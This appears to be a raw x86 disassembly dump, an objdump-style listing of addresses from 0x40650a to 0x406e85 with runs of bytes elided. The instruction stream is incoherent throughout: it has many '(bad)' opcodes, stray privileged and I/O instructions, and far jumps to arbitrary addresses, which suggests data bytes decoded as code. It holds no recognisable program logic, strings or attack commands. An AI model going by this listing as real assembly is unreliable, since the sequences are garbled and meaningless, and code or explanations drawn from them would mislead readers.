  40650a:	sbb    DWORD PTR [ebx-0x7ca28c1c],0x5bfe2de9
  406514:	add    eax,DWORD PTR [eax]
  406516:	hlt    
  406517:	or     eax,DWORD PTR [eax+0x43]
  40651a:	hlt    
  40651b:	add    al,0x9
  40651d:	dec    esp
  40651e:	aaa    
  40651f:	add    eax,0x4f403e9
  406524:	out    dx,eax
  406525:	xor    DWORD PTR [ebx+ecx*4+0x69],0xffffff85
  40652a:	je     0x406531
  40652c:	jmp    0x69cb5c44
  406531:	jle    0x4065a9
  406533:	test   ebp,ebx
  406535:	add    cl,bh
  406537:	(bad)  
  406538:	and    eax,ecx
  40653a:	jo     0x4064c4
  40653c:	ins    BYTE PTR es:[edi],dx
  40653d:	add    esp,esi
  40653f:	add    al,0xd9
  406541:	xor    esi,DWORD PTR [ebp+edx*8+0x68]
  406545:	test   ah,dh
  406547:	cld    
  406548:	call   0x196d3878
  40654d:	iret   
  40654e:	repz add al,0xe6
  406551:	add    esp,DWORD PTR [ebx]
  406553:	xor    eax,0x7cb3d3b9
  406558:	jmp    0x11655960
  40655d:	test   BYTE PTR [eax],al
	...
  406577:	jl     0x4064fe
  406579:	imul   eax,DWORD PTR [esp+esi*8],0xa3e3c904
  406580:	fadd   st(0),st
  406582:	jmp    0x406577
  406584:	cld    
  406585:	in     eax,dx
  406586:	sti    
  406587:	mov    ds:0x9bf3b5f4,eax
  40658c:	cld    
  40658d:	loopne 0x406592
  40658f:	hlt    
  406590:	cld    
  406591:	call   0xf14a59a1
  406596:	add    esi,esp
  406598:	add    al,0xe9
  40659a:	add    esi,esp
  40659c:	add    al,0x46
  40659e:	pop    ebx
  40659f:	leave  
  4065a0:	sub    DWORD PTR [eax+0x79],eax
  4065a3:	shr    DWORD PTR [ecx],0x2
  4065a6:	mov    ch,BYTE PTR [eax+0x1b]
  4065a9:	push   eax
  4065aa:	push   ebp
  4065ab:	and    DWORD PTR [edx],ebp
  4065ad:	add    BYTE PTR [ecx+0x41],al
  4065b0:	cmp    DWORD PTR [edi],esp
  4065b2:	imul   esp,ecx,0x45
  4065b5:	pop    ebx
  4065b6:	mov    ebp,0x1b64a7e8
  4065bb:	jmp    0x2c37:0xad7e8dd1
  4065c2:	mov    dh,0x21
  4065c4:	push   ebp
  4065c5:	xchg   esp,eax
  4065c6:	pusha  
  4065c7:	mov    ds:0xd747adce,eax
  4065cc:	call   0x6a96:0x7b384d10
  4065d3:	enter  0xebdf,0x2e
  4065d7:	cmp    cl,dh
  4065d9:	es leave 
	...
  4065f3:	add    BYTE PTR [edx+0x11],dl
  4065f6:	sub    eax,0xcd7022b4
  4065fb:	fnstenv [esi]
  4065fd:	sbb    al,0xeb
  4065ff:	pop    ecx
  406600:	call   FWORD PTR [edi+edx*8+0x399a0617]
  406607:	je     0x406652
  406609:	je     0x406593
  40660b:	outs   dx,DWORD PTR ds:[esi]
  40660c:	std    
  40660d:	mov    edi,0xcf21daa6
  406612:	and    eax,DWORD PTR [ebp+0x247612cd]
  406618:	loope  0x406625
  40661a:	xchg   esp,eax
  40661b:	inc    eax
  40661c:	call   0xf1e4e425
  406621:	fsub   st,st(0)
  406623:	ins    BYTE PTR es:[edi],dx
  406624:	stos   BYTE PTR es:[edi],al
  406625:	mov    ecx,0x6ff98c8
  40662a:	xor    ebp,DWORD PTR [ebx+0x23c77727]
  406630:	jecxz  0x406630
  406632:	(bad)  
  406633:	sub    ch,BYTE PTR [eax+0x5b]
  406636:	dec    esi
  406637:	inc    edi
  406638:	je     0x406690
  40663a:	or     DWORD PTR [edx+0x50],esi
  40663d:	and    DWORD PTR [eax+0x0],esp
  406640:	hlt    
  406641:	sbb    edi,DWORD PTR [eax+0x6204cb7f]
  406647:	int3   
  406648:	push   edx
  406649:	outs   dx,DWORD PTR ds:[si]
  40664b:	jne    0x406687
  40664d:	bound  eax,QWORD PTR [edi]
  40664f:	ss addr16 jge 0x406699
  406653:	xchg   esp,eax
  406654:	xor    al,bl
  406656:	xchg   DWORD PTR [ebx+0x0],esi
	...
  406670:	add    BYTE PTR [esi+0x68],dl
  406673:	mov    dh,0x46
  406675:	cld    
  406676:	addr16 adc eax,0x1ae47b76
  40667c:	mov    edx,0xc013a65b
  406681:	add    ch,dl
  406683:	(bad)  
  406685:	mov    ah,0xda
  406687:	push   eax
  406688:	in     eax,0xd3
  40668a:	mov    ds:0x8c2ff368,eax
  40668f:	(bad)  
  406690:	ret    
  406691:	imul   ebx,DWORD PTR [bp+di],0x2
  406695:	push   0xffffff94
  406697:	pop    ebp
  406698:	xor    eax,0x77afa4e1
  40669d:	rol    BYTE PTR [ebx+0x79],cl
  4066a0:	xor    dl,cl
  4066a2:	(bad)  
  4066a5:	mov    bh,0x84
  4066a7:	xchg   BYTE PTR [edi-0x75],bh
  4066aa:	clc    
  4066ab:	sbb    ecx,DWORD PTR [ebx-0x2b2691c6]
  4066b1:	sbb    DWORD PTR [eax+0x3],eax
  4066b4:	popf   
  4066b5:	mov    edi,0x775ea684
  4066ba:	mov    dl,0xb9
  4066bc:	dec    ecx
  4066bd:	push   ebp
  4066be:	out    dx,eax
  4066bf:	jecxz  0x406703
  4066c1:	mov    ah,0xa0
  4066c3:	shr    DWORD PTR [eax+0x7b],1
  4066c6:	sbb    eax,0xf7b159cb
  4066cb:	shl    ebx,1
  4066cd:	daa    
  4066ce:	inc    esi
  4066cf:	jp     0x406665
  4066d1:	hlt    
  4066d2:	pop    ebp
  4066d3:	mov    dh,0xbb
	...
  4066ed:	add    BYTE PTR ds:0x6f028646,bh
  4066f3:	jl     0x4066fd
  4066f5:	ss ret 
  4066f7:	div    DWORD PTR [edi+eax*8+0x63d10db2]
  4066fe:	outs   dx,BYTE PTR ds:[esi]
  4066ff:	pop    ebp
  406700:	add    eax,DWORD PTR [eax]
  406702:	hlt    
  406703:	pop    ebp
  406704:	add    eax,DWORD PTR [eax]
  406706:	hlt    
  406707:	loope  0x406781
  406709:	inc    ecx
  40670a:	hlt    
  40670b:	adc    DWORD PTR [ecx+0x41],edi
  40670e:	hlt    
  40670f:	pop    ebp
  406710:	add    eax,DWORD PTR [eax]
  406712:	hlt    
  406713:	loopne 0x40678c
  406715:	inc    ecx
  406716:	hlt    
  406717:	jmp    0x3:0x84f44177
  40671e:	hlt    
  40671f:	fld    QWORD PTR [eax]
  406721:	add    ah,dh
  406723:	inc    eax
  406724:	add    eax,DWORD PTR [eax]
  406726:	hlt    
  406727:	rol    DWORD PTR [edx],cl
  406729:	add    ah,dh
  40672b:	jge    0x406731
  40672d:	add    ah,dh
  40672f:	dec    eax
  406730:	add    eax,DWORD PTR [eax]
  406732:	hlt    
  406733:	rol    BYTE PTR [edx],cl
  406735:	add    ah,dh
  406737:	jge    0x40673d
  406739:	add    ah,dh
  40673b:	inc    eax
  40673c:	add    eax,DWORD PTR [eax]
  40673e:	hlt    
  40673f:	xor    DWORD PTR [ebx],eax
  406741:	add    ah,dh
  406743:	fld    QWORD PTR [eax]
  406745:	add    ah,dh
  406747:	or     BYTE PTR [eax+eax*1],al
  40674a:	hlt    
  40674b:	mov    BYTE PTR [ebx],al
  40674d:	add    ah,dh
  40674f:	fld    QWORD PTR [eax]
	...
  406769:	add    BYTE PTR [eax],al
  40676b:	hlt    
  40676c:	add    BYTE PTR [eax+eax*1],al
  40676f:	hlt    
  406770:	jg     0x406775
  406772:	add    ah,dh
  406774:	fld    QWORD PTR [eax]
  406776:	add    ah,dh
  406778:	or     BYTE PTR [eax+eax*1],al
  40677b:	hlt    
  40677c:	add    al,0x56
  40677e:	add    esi,esp
  406780:	add    al,0x9
  406782:	add    al,0xf4
  406784:	add    al,0xcd
  406786:	add    esi,esp
  406788:	add    al,0xeb
  40678a:	add    esi,esp
  40678c:	add    al,0xc9
  40678e:	(bad)
  406791:	lods   al,BYTE PTR ds:[esi]
  406792:	add    esi,esp
  406794:	add    al,0xe8
  406796:	add    esi,esp
  406798:	add    al,0xe7
  40679a:	add    esi,esp
  40679c:	add    al,0x19
  40679e:	stc    
  40679f:	retf   
  4067a0:	outs   dx,BYTE PTR ds:[esi]
  4067a1:	in     al,0x3
  4067a3:	hlt    
  4067a4:	add    al,0x19
  4067a6:	stc    
  4067a7:	mov    ebx,0x36f7e16e
  4067ac:	add    eax,0x53481e9
  4067b1:	lock add esi,esp
  4067b4:	add    al,0xe8
  4067b6:	add    esi,esp
  4067b8:	add    al,0xb9
  4067ba:	xor    DWORD PTR [eax*1+0x4f403ef],0x4f40411
  4067c5:	mov    eax,ds:0xfb053481
  4067ca:	add    esi,esp
  4067cc:	add    al,0xe1
  4067ce:	add    eax,DWORD PTR [eax]
	...
  4067e8:	hlt    
  4067e9:	add    al,0x45
  4067eb:	xor    DWORD PTR [esp+eax*1+0x4f403d9],0x4f403d1
  4067f6:	jns    0x406779
  4067f8:	mov    ah,0x4
  4067fa:	lock add esi,esp
  4067fd:	add    al,0xf1
  4067ff:	add    esi,esp
  406801:	add    al,0xd5
  406803:	xor    BYTE PTR [esp+eax*1+0x4f403f4],0xe5
  40680b:	add    esi,esp
  40680d:	add    al,0x0
  40680f:	mov    al,0xf7
  406811:	add    al,0x0
  406813:	aaa    
  406814:	and    al,ah
  406816:	jmp    DWORD PTR [edx+0x1e0004f7]
  40681c:	adc    al,ah
  40681e:	call   DWORD PTR [ecx+0xe0004f7]
  406824:	loop   0x4067e9
  406826:	inc    DWORD PTR [edi+esi*8-0x20a1fffc]
  40682d:	ret    
  40682e:	push   DWORD PTR [ebx-0x9]
  406831:	add    al,0x0
  406833:	das    
  406834:	iret   
  406835:	ret    
  406836:	jmp    DWORD PTR [esi-0x10]
  406839:	add    al,0x0
  40683b:	mov    esp,0x55ffc3be
  406840:	lock add al,0x0
  406843:	mov    edi,0x68ffc3ae
  406848:	test   DWORD PTR [eax+eax*1],0xf1
	...
  406863:	add    BYTE PTR [eax],al
  406865:	xchg   edx,eax
  406866:	ret    
  406867:	jmp    DWORD PTR [edi-0x9]
  40686a:	add    al,0x0
  40686c:	aaa    
  40686d:	mov    ds:0xf76affc3,eax
  406872:	add    al,0x0
  406874:	rcl    BYTE PTR [ebx-0x896003d],cl
  40687a:	add    al,0x0
  40687c:	aad    0x63
  40687e:	ret    
  40687f:	jmp    FWORD PTR [edi+esi*8+0x4]
  406883:	add    BYTE PTR [esi+0x5e],bh
  406886:	ret    
  406887:	jmp    FWORD PTR [ebx-0x9]
  40688a:	add    al,0x0
  40688c:	pop    ss
  40688d:	popa   
  40688e:	ret    
  40688f:	jmp    FWORD PTR [esi-0x9]
  406892:	add    al,0x0
  406894:	leave  
  406895:	push   eax
  406896:	ret    
  406897:	jmp    FWORD PTR [ebp-0x9]
  40689a:	add    al,0x0
  40689c:	fisub  DWORD PTR [eax]
  40689e:	ret    
  40689f:	(bad)  
  4068a0:	jmp    DWORD PTR [ebp+0x36000001]
  4068a6:	pusha  
  4068a7:	inc    ecx
  4068a8:	add    BYTE PTR [ecx+eax*1+0x60f00000],dl
  4068af:	inc    ecx
  4068b0:	add    BYTE PTR [edi-0x3cffffff],al
  4068b6:	pusha  
  4068b7:	inc    ecx
  4068b8:	add    BYTE PTR [esi-0xdffffff],dl
  4068be:	pusha  
  4068bf:	inc    ecx
  4068c0:	add    BYTE PTR [ecx+0x8],ah
  4068c3:	add    BYTE PTR [eax],al
  4068c5:	cmp    ebx,DWORD PTR [edx+0x41]
	...
  4068e0:	add    BYTE PTR [eax],al
  4068e2:	push   eax
  4068e3:	or     BYTE PTR [eax],al
  4068e5:	add    bh,bh
  4068e7:	pop    ecx
  4068e8:	inc    ecx
  4068e9:	add    BYTE PTR [ebx+0x1],al
  4068ec:	add    BYTE PTR [eax],al
  4068ee:	mov    cl,0x5b
  4068f0:	inc    ecx
  4068f1:	add    BYTE PTR [eax+ecx*1+0x4],ch
  4068f5:	add    DWORD PTR [edi+0x8],edi
  4068f8:	fadd   DWORD PTR [edx]
  4068fa:	jle    0x406904
  4068fc:	inc    ecx
  4068fd:	add    DWORD PTR [eax+0x8],edi
  406900:	cmp    eax,0x5a086b01
  406905:	add    DWORD PTR [eax+ecx*1+0x60],esi
  406909:	add    DWORD PTR [edi],esp
  40690b:	or     BYTE PTR [esi+0x1],bl
  40690e:	or     BYTE PTR es:[ecx+eax*1+0x31],ah
  406913:	or     BYTE PTR [ecx+0x1],bh
  406916:	xor    ecx,DWORD PTR [eax]
  406918:	jge    0x40691b
  40691a:	ret    0x7b07
  40691d:	add    DWORD PTR [eax+ecx*1],ebx
  406920:	add    eax,0xdb081f01
  406925:	add    cl,BYTE PTR [esi]
  406927:	or     BYTE PTR [edx+0x1],al
  40692a:	push   0x6b013e08
  40692f:	or     BYTE PTR [ebx+0x1],bl
  406932:	hlt    
  406933:	mov    al,BYTE PTR [ebx]
  406935:	(bad)  
  406936:	not    BYTE PTR [ebx+eax*1+0x387f561]
  40693d:	pop    edi
  40693e:	cmc    
  40693f:	xchg   BYTE PTR [ebx],al
  406941:	gs cmc 
  406943:	icebp  
  406944:	add    bh,BYTE PTR [edx+0x0]
	...
  40695f:	cmc    
  406960:	fadd   DWORD PTR [edx]
  406962:	(bad)  
  406964:	jecxz  0x406968
  406966:	jle    0x40695d
  406968:	retf   0x7c02
  40696b:	cmc    
  40696c:	sbb    eax,0x1ef55403
  406971:	add    eax,DWORD PTR [edx]
  406973:	cmc    
  406974:	sbb    BYTE PTR [ebx],al
  406976:	cmp    ebp,esi
  406978:	and    eax,DWORD PTR [ebx]
  40697a:	push   es
  40697b:	cmc    
  40697c:	and    eax,0x27f50c03
  406981:	add    ebx,DWORD PTR [eax]
  406983:	cmc    
  406984:	mov    cl,0x2
  406986:	sbb    dh,ch
  406988:	call   0x1002:0xadf50e02
  40698f:	cmc    
  406990:	lods   al,BYTE PTR ds:[esi]
  406991:	add    al,BYTE PTR [ebx-0xb]
  406994:	pop    DWORD PTR [edx]
  406996:	inc    edi
  406997:	cmc    
  406998:	nop
  406999:	add    dl,BYTE PTR [eax-0xb]
  40699c:	xchg   ebp,eax
  40699d:	add    bl,BYTE PTR [eax-0xb]
  4069a0:	xchg   esp,eax
  4069a1:	add    ch,BYTE PTR [esi-0xb]
  4069a4:	inc    esi
  4069a5:	add    dh,BYTE PTR [eax-0xb]
  4069a8:	stos   DWORD PTR es:[edi],eax
  4069a9:	add    ah,BYTE PTR [edx-0xb]
  4069ac:	jge    0x4069b0
  4069ae:	push   ebp
  4069af:	cmc    
  4069b0:	jle    0x4069b4
  4069b2:	add    esi,ebp
  4069b4:	js     0x4069b8
  4069b6:	cmp    dh,ch
  4069b8:	add    DWORD PTR [edx],0x7
  4069bb:	cmc    
  4069bc:	test   DWORD PTR [edx],eax
  4069be:	or     eax,0x190287f5
	...
  4069db:	add    ch,dh
  4069dd:	add    al,0x55
  4069df:	add    bl,bh
  4069e1:	add    eax,0x5eb024e
  4069e6:	pop    ecx
  4069e7:	add    al,BYTE PTR ds:0xb0025806
  4069ed:	add    eax,0x5ac023b
  4069f2:	xor    al,0x2
  4069f4:	lds    eax,FWORD PTR ds:0x5ad0231
  4069fa:	xor    BYTE PTR [edx],al
  4069fc:	fwait
  4069fd:	add    eax,0x5850222
  406a02:	pop    ds
  406a03:	add    dl,BYTE PTR [edi-0x32fde9fb]
  406a09:	pop    es
  406a0a:	dec    eax
  406a0b:	add    eax,0x54f0412
  406a10:	sbb    BYTE PTR [eax+edx*2],al
  406a13:	add    eax,0x5420424
  406a18:	repnz add edi,DWORD PTR ds:0x98040005
  406a1f:	add    bl,BYTE PTR [ebx]
  406a21:	add    al,0x97
  406a23:	add    dl,BYTE PTR [ecx]
  406a25:	add    al,0x90
  406a27:	add    ah,ch
  406a29:	add    edx,DWORD PTR [edx-0x7afbf4fe]
  406a2f:	add    ch,cl
  406a31:	add    esp,DWORD PTR [edx+eax*1+0x2af03ee]
  406a38:	cld    
  406a39:	add    edx,DWORD PTR [edx+eax*1+0x2c103d4]
	...
  406a58:	add    al,ah
  406a5a:	add    edi,DWORD PTR [edx+eax*1+0x2b70408]
  406a61:	rol    BYTE PTR [ebx],1
  406a63:	test   BYTE PTR [edx],al
  406a65:	inc    DWORD PTR [ebx]
  406a67:	pop    DWORD PTR [edx]
  406a69:	in     eax,dx
  406a6a:	add    esi,DWORD PTR [edx+eax*1+0x15]
  406a6e:	add    al,0x0
  406a70:	jno    0x406a68
  406a72:	pop    es
  406a73:	add    DWORD PTR [esi+esi*8-0x29],ebp
  406a77:	add    BYTE PTR [edi-0xa],ah
  406a7a:	mov    DWORD PTR [eax],0x12cf78b
  406a80:	mov    dh,bh
  406a82:	rol    BYTE PTR [eax],cl
  406a84:	test   bh,dh
  406a86:	sbb    al,0x1
  406a88:	(bad)  
  406a89:	imul   DWORD PTR ds:0x16f79301
  406a8f:	add    DWORD PTR [edx+0x7d0126f7],eax
  406a95:	mul    edx
  406a97:	add    BYTE PTR [edx-0x9],bl
  406a9a:	rol    DWORD PTR [eax],1
  406a9c:	push   esp
  406a9d:	neg    DWORD PTR [ebx]
  406a9f:	add    DWORD PTR [edi-0x9],ebx
  406aa2:	sub    BYTE PTR [ecx],al
  406aa4:	push   ebx
  406aa5:	not    DWORD PTR ds:0x25f74201
  406aab:	add    DWORD PTR ds:0x3400e1f7,edi
  406ab1:	idiv   DWORD PTR [esi-0x4208d200]
  406ab7:	add    BYTE PTR [ecx-0x59fefb0a],ch
	...
  406ad5:	add    dh,dh
  406ad7:	sbb    al,BYTE PTR [ecx]
  406ad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ada:	not    BYTE PTR [edx]
  406adc:	add    DWORD PTR [esi-0x67fee10a],ebx
  406ae2:	idiv   BYTE PTR [edi-0x47096500]
  406ae8:	add    BYTE PTR [edx-0x6ffecd0a],bl
  406aee:	div    dh
  406af0:	add    ah,al
  406af2:	neg    ah
  406af4:	add    BYTE PTR [edi-0x76ff210a],bh
  406afa:	test   BYTE PTR [ebx],0x1
  406afd:	xchg   dh,dh
  406aff:	sbb    DWORD PTR [ecx],eax
  406b01:	add    BYTE PTR [ecx+0x6a011706],cl
  406b07:	push   es
  406b08:	sub    eax,DWORD PTR [ecx]
  406b0a:	int3   
  406b0b:	push   es
  406b0c:	inc    esi
  406b0d:	add    edi,ecx
  406b0f:	push   es
  406b10:	dec    ebp
  406b11:	add    DWORD PTR [esi-0x2bfec8fa],ebx
  406b17:	push   es
  406b18:	jae    0x406b1b
  406b1a:	enter  0x6906,0x1
  406b1e:	mov    ebx,0x3b016b06
  406b23:	add    DWORD PTR [esi],edi
  406b25:	and    BYTE PTR [ecx+eax*1+0x2],ch
  406b29:	xor    BYTE PTR [edi+0x1],bh
  406b2c:	or     al,0x30
  406b2e:	jle    0x406b31
  406b30:	or     eax,0x101b130
  406b35:	xor    BYTE PTR [eax+0x30fb01],dh
	...
  406b53:	inc    ebx
  406b54:	add    dl,dh
  406b56:	xor    BYTE PTR [edx],dh
  406b58:	add    BYTE PTR [ecx-0x5cffbad0],ah
  406b5e:	xor    BYTE PTR [eax+eax*1-0x5b],al
  406b62:	xor    BYTE PTR [edi],dh
  406b64:	add    BYTE PTR [edi-0x56ffc9d0],ah
  406b6a:	xor    BYTE PTR [ecx-0x3],ch
  406b6d:	loop   0x406b9f
  406b6f:	push   0x7b30e4fd
  406b74:	std    
  406b75:	out    0x30,al
  406b77:	sub    bh,ch
  406b79:	ret    0x1d30
  406b7c:	std    
  406b7d:	sti    
  406b7e:	xor    BYTE PTR [edi*8-0x2f0cf5f],bl
  406b85:	mov    ds:0xa5fd0e30,eax
  406b8a:	xor    BYTE PTR [ecx],ah
  406b8c:	std    
  406b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b8e:	xor    BYTE PTR [eax],ah
  406b90:	std    
  406b91:	test   eax,0x7c7f430
  406b96:	stos   DWORD PTR es:[edi],eax
  406b97:	and    al,0xcf
  406b99:	pop    es
  406b9a:	lods   eax,DWORD PTR ds:[esi]
  406b9b:	and    al,0xc6
  406b9d:	pop    es
  406b9e:	scas   eax,DWORD PTR es:[edi]
  406b9f:	and    al,0xc5
  406ba1:	pop    es
  406ba2:	mov    cl,0x4
  406ba4:	xor    al,0x8
  406ba6:	mov    bl,0x4
  406ba8:	xor    ecx,DWORD PTR [eax]
  406baa:	mov    ch,0x4
  406bac:	mov    ds:0x8904b708,al
  406bb1:	or     BYTE PTR [ecx-0x44f7701c],bh
	...
  406bcf:	add    ah,ah
  406bd1:	jbe    0x406bdb
  406bd3:	mov    ebp,0xbf081de4
  406bd8:	in     al,0x1c
  406bda:	or     cl,al
  406bdc:	les    ebx,FWORD PTR [ebx]
  406bde:	or     ah,al
  406be0:	les    ebx,FWORD PTR [edx]
  406be2:	or     dh,al
  406be4:	les    ebx,FWORD PTR [ecx]
  406be6:	or     al,cl
  406be8:	les    esp,FWORD PTR [eax]
  406bea:	or     dl,cl
  406bec:	and    al,0x18
  406bee:	or     bl,cl
  406bf0:	and    al,0x1f
  406bf2:	or     ah,cl
  406bf4:	and    al,0x36
  406bf6:	or     ch,cl
  406bf8:	and    al,0x35
  406bfa:	or     dh,cl
  406bfc:	add    al,0x24
  406bfe:	or     bh,cl
  406c00:	add    al,0x23
  406c02:	or     dl,dl
  406c04:	add    al,0xb2
  406c06:	pop    es
  406c07:	aad    0x4
  406c09:	cdq    
  406c0a:	pop    es
  406c0b:	fsub   st,st(4)
  406c0d:	lahf   
  406c0e:	pop    es
  406c0f:	fnsetpm(287 only) 
  406c11:	xchg   BYTE PTR [edi],al
  406c13:	fsubrp st(4),st
  406c15:	lea    eax,[edi]
  406c17:	(bad)  
  406c19:	mov    WORD PTR [edi],es
  406c1b:	loopne 0x406be1
  406c1d:	mov    eax,DWORD PTR [edi]
  406c1f:	loope  0x406be5
  406c21:	mov    al,BYTE PTR [edi]
  406c23:	loop   0x406be9
  406c25:	add    al,0xbd
  406c27:	pop    es
  406c28:	nop
  406c29:	xor    al,0xb4
  406c2b:	pop    es
  406c2c:	pop    edx
  406c2d:	xor    al,0xbf
  406c2f:	pop    es
  406c30:	pop    esp
  406c31:	xor    al,0xb6
  406c33:	pop    es
	...
  406c4c:	add    BYTE PTR [ebp+0x34],cl
  406c4f:	mov    eax,ds:0xa0344e07
  406c54:	pop    es
  406c55:	pop    edi
  406c56:	xor    al,0x93
  406c58:	pop    es
  406c59:	pop    eax
  406c5a:	xor    al,0x92
  406c5c:	pop    es
  406c5d:	push   ecx
  406c5e:	xor    al,0x45
  406c60:	pop    es
  406c61:	dec    ebx
  406c62:	xor    al,0x3c
  406c64:	pop    es
  406c65:	daa    
  406c66:	xor    al,0x37
  406c68:	pop    es
  406c69:	(bad)  
  406c6a:	xor    al,0x2e
  406c6c:	pop    es
  406c6d:	xor    BYTE PTR [edx*4-0x7e0117fa],0x6
  406c75:	out    dx,eax
  406c76:	(bad)  
  406c77:	jne    0x406c7f
  406c79:	jmp    0x406c79
  406c7b:	daa    
  406c7c:	push   es
  406c7d:	aad    0xfe
  406c7f:	sub    al,BYTE PTR [esi]
  406c81:	(bad)  
  406c82:	(bad)  
  406c83:	sub    DWORD PTR [esi],eax
  406c85:	pop    ss
  406c86:	jmp    FWORD PTR [esi+eax*1]
  406c89:	adc    bh,bh
  406c8b:	and    eax,DWORD PTR [esi]
  406c8d:	sbb    edi,edi
  406c8f:	cs push es
  406c91:	adc    bh,bh
  406c93:	and    eax,0x20ff1b06
  406c98:	push   es
  406c99:	sbb    al,0xff
  406c9b:	pop    ds
  406c9c:	push   es
  406c9d:	or     eax,0xe01b2ff
  406ca2:	push   DWORD PTR [ecx-0x5b0120ff]
  406ca8:	add    eax,ebx
  406caa:	(bad)  
  406cab:	fwait
  406cac:	add    ecx,edx
  406cae:	(bad)  
  406caf:	mov    dh,0x1
	...
  406cc9:	add    dl,cl
  406ccb:	(bad)  
  406ccc:	lods   eax,DWORD PTR ds:[esi]
  406ccd:	add    ebx,esp
  406ccf:	(bad)  
  406cd0:	call   FWORD PTR [eax-0x67f9cb0b]
  406cd6:	cmc    
  406cd7:	xor    eax,DWORD PTR [esi]
  406cd9:	mov    ebx,0xba0632f5
  406cde:	cmc    
  406cdf:	xor    DWORD PTR [esi],eax
  406ce1:	mov    ebp,0xb40630f5
  406ce6:	cmc    
  406ce7:	das    
  406ce8:	push   es
  406ce9:	lahf   
  406cea:	cmc    
  406ceb:	cs push es
  406ced:	xchg   esi,eax
  406cee:	cmc    
  406cef:	sub    eax,0x2cf59106
  406cf4:	push   es
  406cf5:	nop
  406cf6:	cmc    
  406cf7:	sub    eax,DWORD PTR [esi]
  406cf9:	inc    ebx
  406cfa:	cmc    
  406cfb:	sub    al,BYTE PTR [esi]
  406cfd:	dec    ecx
  406cfe:	cmc    
  406cff:	les    eax,FWORD PTR ds:0x5c3f548
  406d05:	dec    ebx
  406d06:	cmc    
  406d07:	ret    0x4a05
  406d0a:	cmc    
  406d0b:	rol    DWORD PTR ds:0x5c0f545,0x4c
  406d12:	cmc    
  406d13:	mov    edi,0xbef54705
  406d18:	add    eax,0x5bdf50e
  406d1d:	adc    ebp,esi
  406d1f:	mov    esp,0xbbf50005
  406d24:	add    eax,0x5baf503
  406d29:	adc    dh,ch
  406d2b:	mov    ecx,0xd05
	...
  406d44:	add    BYTE PTR [eax],al
  406d46:	add    ch,dh
  406d48:	mov    eax,0xb7f50405
  406d4d:	add    eax,0x5b6f4ff
  406d52:	(bad)  
  406d53:	hlt    
  406d54:	mov    ch,0x5
  406d56:	fxtract 
  406d58:	aam    0x5
  406d5a:	fdiv   st,st(4)
  406d5c:	rol    DWORD PTR ds:0x5d2f4db,cl
  406d62:	add    BYTE PTR [ebx+eax*1+0x52],ch
  406d66:	add    al,0x7f
  406d68:	add    edx,DWORD PTR [ebx+0x4]
  406d6b:	jle    0x406d70
  406d6d:	push   ecx
  406d6e:	add    al,0x79
  406d70:	add    edx,DWORD PTR [esp+eax*1+0x28]
  406d74:	add    al,0x55
  406d76:	add    al,0xbb
  406d78:	add    edx,DWORD PTR [esi+0x4]
  406d7b:	mov    edx,0xb5045703
  406d80:	add    ebx,DWORD PTR [eax+0x4]
  406d83:	les    eax,FWORD PTR [ebx]
  406d85:	pop    ecx
  406d86:	add    al,0xa7
  406d88:	add    ebx,DWORD PTR [edx+0x4]
  406d8b:	mov    dh,0x3
  406d8d:	pop    ebx
  406d8e:	add    al,0x1
  406d90:	add    al,0x5c
  406d92:	add    al,0x60
  406d94:	add    edx,DWORD PTR [ecx+0x5e038304]
  406d9a:	add    al,0x72
  406d9c:	add    ebx,DWORD PTR [edi+0x4]
  406d9f:	jge    0x406da4
  406da1:	push   ss
  406da2:	and    DWORD PTR [ebx+eax*1+0x38f0402],ebx
  406da9:	add    eax,DWORD PTR [eax+eax*1]
	...
  406dc4:	mov    es,WORD PTR [ebx]
  406dc6:	add    DWORD PTR [ecx+ecx*4],eax
  406dc9:	add    eax,DWORD PTR [esp+eax*1]
  406dcc:	cwde   
  406dcd:	add    eax,DWORD PTR ds:0x6064b04
  406dd3:	add    al,0x4a
  406dd5:	push   es
  406dd6:	pop    es
  406dd7:	add    al,0x45
  406dd9:	push   es
  406dda:	or     BYTE PTR [esp+esi*1],al
  406ddd:	push   es
  406dde:	or     DWORD PTR [edi+esi*1],eax
  406de1:	push   es
  406de2:	or     al,BYTE PTR [esi+eax*1]
  406de5:	push   es
  406de6:	or     eax,DWORD PTR [ecx+edx*1]
  406de9:	push   es
  406dea:	or     al,0x4
  406dec:	nop
  406ded:	pop    es
  406dee:	nop
  406def:	add    al,0x93
  406df1:	pop    es
  406df2:	push   cs
  406df3:	add    al,0xf4
  406df5:	jp     0x406df9
  406df7:	psubb  mm5,QWORD PTR [ebp-0x530fb1fe]
  406dfe:	add    dh,BYTE PTR [eax]
  406e00:	clc    
  406e01:	scas   eax,DWORD PTR es:[edi]
  406e02:	add    dh,BYTE PTR [ecx]
  406e04:	lock scas al,BYTE PTR es:[edi]
  406e06:	add    al,BYTE PTR [esi-0x8]
  406e09:	test   eax,0xb0f03402
  406e0e:	add    dh,BYTE PTR ds:0x4402abf8
  406e14:	lock mov dl,0x2
  406e17:	xor    edi,eax
  406e19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e1a:	add    al,BYTE PTR [ebp-0x10]
  406e1d:	xchg   esp,eax
  406e1e:	add    bh,BYTE PTR [eax]
  406e20:	clc    
  406e21:	xchg   edi,eax
  406e22:	add    bh,BYTE PTR [ecx]
  406e24:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e26:	add    bh,BYTE PTR [edx]
	...
  406e40:	add    al,bh
  406e42:	add    DWORD PTR [edx],0x218f03b
  406e48:	cmp    al,0xf8
  406e4a:	xor    eax,DWORD PTR [edx]
  406e4c:	cmp    eax,0x3e022af0
  406e51:	clc    
  406e52:	sbb    eax,0xfcf03f02
  406e57:	add    DWORD PTR [edi-0x8],ecx
  406e5a:	inc    DWORD PTR [ecx]
  406e5c:	inc    eax
  406e5d:	lock inc BYTE PTR [ecx]
  406e60:	inc    ecx
  406e61:	clc    
  406e62:	stc    
  406e63:	add    DWORD PTR [edx-0x10],eax
  406e66:	and    BYTE PTR [edx],al
  406e68:	inc    ebx
  406e69:	clc    
  406e6a:	sbb    eax,DWORD PTR [edx]
  406e6c:	lock and al,BYTE PTR ss:[edx]
  406e70:	xor    bh,al
  406e72:	adc    eax,0x24f04c02
  406e77:	add    cl,BYTE PTR [ebx-0x8]
  406e7a:	daa    
  406e7b:	add    dh,BYTE PTR [edi]
  406e7d:	lock test BYTE PTR [ecx],0x48
  406e81:	clc    
  406e82:	adc    DWORD PTR [edx],eax
  406e84:	dec    ebp
  406e85:	lock add al,0xc4
